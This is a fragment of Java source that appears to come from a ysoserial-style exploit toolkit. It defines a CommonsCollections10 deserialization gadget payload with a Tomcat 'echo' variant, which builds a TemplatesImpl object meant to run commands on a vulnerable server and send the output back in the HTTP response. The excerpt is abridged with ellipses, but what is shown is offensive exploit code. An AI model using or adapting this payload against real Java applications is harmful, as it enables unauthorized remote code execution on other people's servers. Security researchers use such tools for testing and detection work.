...
public class CommonsCollections10TomcatEcho  extends PayloadRunner implements ObjectPayload<HashSet> {

    public HashSet getObject(final String command) throws Exception {
//        final Object templates = Gadgets.createTemplatesImpl(command);
        final Object templates = Gadgets.createTemplatesTomcatEcho();
    ...
    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections10TomcatEcho.class, args);
    }
